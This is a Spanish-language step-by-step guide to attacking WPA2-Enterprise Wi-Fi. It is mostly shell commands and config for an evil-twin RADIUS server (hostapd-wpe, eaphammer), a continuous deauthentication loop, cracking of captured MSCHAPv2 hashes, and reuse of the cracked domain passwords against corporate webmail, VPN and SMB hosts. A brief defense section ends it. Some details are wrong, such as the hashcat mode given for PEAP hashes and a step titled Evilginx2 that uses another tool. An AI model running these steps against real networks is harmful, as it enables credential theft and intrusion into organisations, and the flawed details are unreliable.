# WPA2 Enterprise Attacks

WPA2 Enterprise (también llamado WPA2-EAP) usa un servidor RADIUS para autenticar a los usuarios en lugar de una contraseña compartida (PSK). Se usa en entornos corporativos, universidades y redes grandes.

```
WPA2 Personal (PSK):
Cliente → [Contraseña] → AP → Acceso

WPA2 Enterprise (EAP):
Cliente → [Usuario + Contraseña] → AP → Servidor RADIUS → Acceso

En airodump-ng se identifica por:
→ ENC: WPA2
→ AUTH: MGT   (en lugar de PSK)
→ CIPHER: CCMP
```

### Protocolos de autenticación EAP

```
EAP-TLS:
→ Autenticación mutua con certificados (cliente + servidor)
→ El más seguro → difícil de atacar
→ Requiere certificado en el dispositivo cliente
→ Muy poco frecuente en PYMES

PEAP (Protected EAP):
→ El más común en empresas y universidades
→ El servidor se autentica con certificado
→ El cliente se autentica con usuario/contraseña (MSCHAPv2)
→ El cliente DEBE verificar el certificado del servidor
→ Si no verifica → vulnerable a Evil Twin Enterprise

EAP-TTLS:
→ Similar a PEAP pero más flexible
→ El cliente se autentica con usuario/contraseña dentro del túnel TLS
→ También vulnerable si el cliente no verifica el certificado

EAP-MD5:
→ Legacy, muy inseguro
→ No usa TLS → credenciales expuestas

EAP-FAST:
→ Usado principalmente por Cisco
→ Usa PAC (Protected Access Credentials)
```

### Por qué es vulnerable PEAP/EAP-TTLS

```
El ataque se basa en que muchos clientes:
→ NO verifican el certificado del servidor RADIUS
→ O tienen configurado "Aceptar cualquier certificado"
→ O los usuarios aceptan certificados desconocidos sin comprobar

El atacante crea un servidor RADIUS falso:
→ Con el mismo SSID que la red corporativa legítima
→ Con un certificado autofirmado (no válido, pero el cliente lo acepta)
→ El cliente se conecta, inicia el handshake PEAP/TTLS
→ El servidor falso captura el challenge/response MSCHAPv2
→ El hash MSCHAPv2 se puede crackear offline
```

### Paso 1 — Identificar la red Enterprise

```bash
# En airodump-ng buscar:
airodump-ng wlan0mon

# Red Enterprise:
# BSSID              PWR  CH   ENC   CIPHER  AUTH   ESSID
# AA:BB:CC:DD:EE:FF  -45   6  WPA2  CCMP    MGT    CorpWiFi
#                                          ↑
#                                        MGT = Enterprise

# Verificar con Wireshark si hay tramas EAP:
wireshark captura.pcap
# Filtro: eap
# Si hay tramas EAP → Enterprise confirmado
# Ver el tipo: EAP-TLS, PEAP, EAP-TTLS...
```

### Paso 2 — Evil Twin Enterprise con hostapd-wpe

hostapd-wpe (Wireless Pwnage Edition) es una versión modificada de hostapd que actúa como servidor RADIUS falso y captura automáticamente las credenciales MSCHAPv2.

```bash
# Instalación
apt install hostapd-wpe
# o compilar desde fuente:
git clone https://github.com/OpenSecurityResearch/hostapd-wpe.git

# Configurar hostapd-wpe.conf
cat > /etc/hostapd-wpe.conf << EOF
# Interfaz
interface=wlan0

# SSID igual al de la red corporativa objetivo
ssid=CorpWiFi

# Canal (igual al del AP legítimo para maximizar interferencia)
channel=6

# Modo de hardware
hw_mode=g

# Métodos EAP habilitados (aceptar todos para capturar más credenciales)
eap_server=1
eap_user_file=/etc/hostapd/hostapd-wpe.eap_user
ca_cert=/etc/hostapd/ca.pem
server_cert=/etc/hostapd/server.pem
private_key=/etc/hostapd/server.key
private_key_passwd=whatever

# Sin verificación de cliente (aceptar cualquier conexión)
auth_algs=3
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
EOF

# El archivo eap_user por defecto acepta todos los tipos EAP
cat > /etc/hostapd/hostapd-wpe.eap_user << EOF
*    PEAP,TTLS,TLS
*    MSCHAPV2,MD5,GTC  [2]
EOF
```

```bash
# Iniciar hostapd-wpe
hostapd-wpe /etc/hostapd-wpe.conf

# Las credenciales capturadas se muestran en pantalla y en:
tail -f /var/log/hostapd-wpe.log

# Formato de las credenciales capturadas:
# username: juan.garcia
# challenge: AA:BB:CC:DD:EE:FF:00:11
# response:  22:33:44:55:66:77:88:99:AA:BB:CC:DD:EE:FF:00:11:22:33:44:55:66:77:88:99
```

### Paso 3 — Deauth al AP legítimo

```bash
# Forzar a los clientes a desconectarse del AP real para conectarse al falso
aireplay-ng -0 0 -a BSSID_AP_LEGITIMO wlan1mon

# Si hay múltiples APs (red enterprise con varios puntos de acceso):
# Deauth a todos los APs del SSID corporativo
while true; do
    for bssid in $(grep "CorpWiFi" wps_scan.csv | cut -d',' -f1); do
        aireplay-ng -0 5 -a $bssid wlan1mon 2>/dev/null
    done
    sleep 5
done
```

### Paso 4 — Crackear el hash MSCHAPv2

```bash
# El hash capturado tiene el formato MSCHAPv2:
# username: juan.garcia
# challenge: AAAAAAAAAAAAAAAA (16 bytes)
# response:  BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB (24 bytes)

# Crackear con asleap
asleap \
    -C AA:BB:CC:DD:EE:FF:00:11 \
    -R 22:33:44:55:66:77:88:99:AA:BB:CC:DD:EE:FF:00:11:22:33:44:55:66:77:88:99 \
    -W /usr/share/wordlists/rockyou.txt

# Crackear con hashcat
# Modo 5500 = NetNTLMv1 (EAP-MD5)
# Modo 5600 = NetNTLMv2 (MSCHAPv2 de PEAP)

# Formato para hashcat:
# usuario::dominio:challenge:response_NT_hash:response
# (hostapd-wpe genera automáticamente el hash en este formato)

# Ver el hash generado por hostapd-wpe en formato hashcat
cat /var/log/hostapd-wpe.log | grep "HASHCAT"
# hostapd-wpe moderno genera el hash ya en formato hashcat

# Crackear
hashcat -m 5600 mschapv2_hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5600 mschapv2_hash.txt /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule

# Si el hash está en formato NetNTLMv1 (EAP-MD5, más débil):
hashcat -m 5500 ntlmv1_hash.txt /usr/share/wordlists/rockyou.txt
```

***

### Paso 5 — Evilginx2 para Enterprise con verificación de certificado

```bash
# Si los clientes SÍ verifican el certificado (EAP-TLS o PEAP con verificación):
# No se puede usar hostapd-wpe directamente

# Alternativa: obtener el certificado legítimo por otros medios
# 1. Ingeniería social para obtener el certificado del servidor RADIUS
# 2. Ataque a la PKI interna de la empresa
# 3. Usar eaphammer con un certificado similar al legítimo

# eaphammer — herramienta más moderna para Enterprise attacks
git clone https://github.com/s0lst1c3/eaphammer.git
cd eaphammer
pip3 install -r requirements.txt

# Generar certificado con el mismo CN que el servidor RADIUS legítimo
./eaphammer --cert-wizard

# Iniciar el ataque
./eaphammer -i wlan0 \
    --channel 6 \
    --auth wpa-eap \
    --essid CorpWiFi \
    --creds \
    --negotiate balanced
```

### Usar las credenciales obtenidas

```bash
# Las credenciales MSCHAPv2 crackeadas son contraseñas de dominio Windows
# (Active Directory)

# Si la empresa usa VPN o Exchange con esas credenciales:
# → Probar en webmail: https://mail.empresa.com/owa
# → Probar en VPN: https://vpn.empresa.com
# → Probar en SharePoint, Teams, etc.

# Si se tiene acceso a la red interna:
# → Las credenciales Windows pueden usarse para movimiento lateral en AD
# → Pass-the-Hash, Kerberoasting desde la red Wi-Fi corporativa

# Con NetExec para verificar el acceso:
nxc smb RANGO_IP_CORPORATIVO -u juan.garcia -p ContraseñaCrackeada --continue-on-success
```

### Reconocimiento pasivo

```bash
# Capturar tramas EAP para identificar:
# → Qué tipo de EAP usa la red (PEAP, TTLS, TLS...)
# → Nombres de usuario (en EAP-Identity, antes del túnel TLS)

wireshark captura.pcap
# Filtro: eap
# Buscar: EAP Response Identity → revela el nombre de usuario
# Ejemplo: "juan.garcia@empresa.local"

# Los nombres de usuario revelan:
# → El formato de usuario de la empresa (nombre.apellido, iniciales, etc.)
# → El dominio de Active Directory (empresa.local, corp.empresa.com)
# → Información para ataques posteriores (password spraying en AD)
```

### Defensa y cómo detectarlo

```
Protecciones que dificultan el ataque:
→ Validar el certificado del servidor RADIUS en el cliente
→ Anclar (pin) el certificado del servidor RADIUS
→ Usar EAP-TLS (certificados de cliente) en lugar de PEAP
→ WIDS (Wireless Intrusion Detection System) que detecta APs falsos
→ Rogue AP detection en controladoras Wi-Fi enterprise

Cómo identificar clientes vulnerables:
→ Dispositivos que se conectan al Evil Twin = cliente no valida certificado
→ Sistemas Windows con políticas de grupo incorrectas
→ Dispositivos móviles (Android/iOS) con "Validar certificado" desactivado
→ Dispositivos legacy con drivers Wi-Fi sin soporte para validación
```

> hostapd-wpe captura automáticamente los hashes MSCHAPv2 y los formatea para hashcat. La combinación hostapd-wpe + hashcat -m 5600 es el flujo estándar para atacar PEAP/EAP-TTLS.

> Los nombres de usuario en las tramas EAP-Identity son visibles incluso sin el ataque completo — se envían antes de que se establezca el túnel TLS. Capturar esos nombres con Wireshark es reconocimiento pasivo muy valioso para ataques posteriores a AD.

> En redes enterprise reales, el ataque depende completamente de que los clientes no validen el certificado del servidor RADIUS. Antes de montar toda la infraestructura, verificar con Wireshark si hay clientes que se conecten voluntariamente a APs sin certificado válido.
